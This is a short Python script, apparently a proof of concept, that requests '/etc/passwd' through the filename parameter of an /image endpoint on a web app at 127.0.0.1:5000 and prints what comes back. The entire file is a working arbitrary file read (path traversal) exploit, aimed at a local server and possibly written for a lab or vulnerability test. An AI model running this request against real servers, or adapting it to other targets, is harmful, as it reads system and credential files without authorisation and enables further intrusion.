import requests

url = 'http://127.0.0.1:5000/image?filename=/etc/passwd'

content = requests.get(url)

print(content.text)